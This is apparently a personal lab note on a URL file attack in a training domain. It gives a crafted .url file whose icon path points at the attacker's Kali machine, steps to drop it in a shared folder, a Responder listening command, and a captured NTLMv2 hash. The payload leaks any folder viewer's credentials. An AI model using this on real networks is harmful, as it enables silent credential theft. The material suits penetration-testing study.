**A URL file attack captures account hashes via a user accessing a folder that contains a specially crafted file that forces the user to request an icon off the attackers machine. The resource does not exist though. The act of initiating a connection to the attackers machine is how the hash is captured. Also note that the user does not need to open the file, nor is their any indication that anything has happened behind the scenes. They just need to open the folder that the file is located in which makes this a perfect for shared folders. **

In Windows 10 VM, create notepad file:
```batch
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\$KALI\%USERNAME%.icon
IconIndex=1
```
Save file as "@test.url" in:
`\\Xandar.MARVEL.local\hackme`
[[1_Responder]]
```bash
sudo responder -I eth0 -v
```
Whatever user opens the folder is the hash we will capture in responder. Note the NTLMv2 hash.
Now go to Windows VM, and access the hackme share.
Win+R
```batch
\\Xandar.MARVEL.local\hackme
```
`groot::MARVEL:8b5fbb978d112491:18D9D8D8024A56674DD599A9BB864E87:010100000000000080E56134C3FDD701DDD68E450296A7100000000002000800540039005`
